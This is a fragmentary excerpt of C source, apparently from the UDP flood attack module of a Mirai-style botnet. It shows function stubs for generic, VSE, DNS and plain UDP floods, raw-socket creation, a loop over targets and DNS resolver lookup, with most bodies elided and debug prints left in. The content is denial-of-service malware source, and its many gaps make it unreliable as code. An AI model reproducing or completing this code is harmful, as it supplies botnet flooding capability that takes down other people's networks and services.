...
void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
...
#ifdef DEBUG
    printf("[attack_udp]attack_udp_generic statrt\n");
#endif
    if (data_len > 1460)
        data_len = 1460;
    ...
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack1.errno=%d\n",errno);
#endif
        return;
    }
    i = 1;
      ...
      for (i = 0; i < targs_len; i++)
        {
            ...
            //printf("a");//ttack_udp_generic break. errno = %d\n", errno);
            //break;
           // if (errno != 0)
              //  printf("errno = %d\n", errno);
			//}
...
#ifdef DEBUG
        printf("[attack_udp]attack_udp_vse statrt\n");
#endif
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
...
#ifdef DEBUG
        printf("[attack_udp]attack_udp_dns statrt\n");
#endif
    if (domain == NULL)
    {
#ifdef DEBUG
...
#ifdef DEBUG
        printf("[attack_udp]attack_udp_plain statrt\n");
#endif
    if (sport == 0xffff)
    {
        sport = rand_next();
...
static ipv4_t get_dns_resolver(void)
{
    ...
    #ifdef DEBUG
        printf("[attack_udp]get_dns_resolver statrt\n");
#endif
    if (fd >= 0)
    {
        int ret, nspos;
